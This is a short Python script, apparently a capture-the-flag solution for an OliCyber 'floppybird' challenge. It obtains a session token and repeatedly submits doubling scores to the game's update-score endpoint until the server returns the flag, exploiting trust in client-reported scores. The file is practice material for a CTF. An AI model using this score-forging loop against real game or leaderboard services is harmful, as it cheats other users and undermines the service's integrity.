import requests

URL = 'http://floppybird.challs.olicyber.it/'

session = requests.Session()

r = session.get(URL+'get-token')

token = r.json()['token']
i = 1
while True:
    
    r = session.post(URL+'update-score', json={
        'token': token,
        'score': i})
    i *=2 
    if "flag" in r.json():
        print(r.json()['flag'])
        break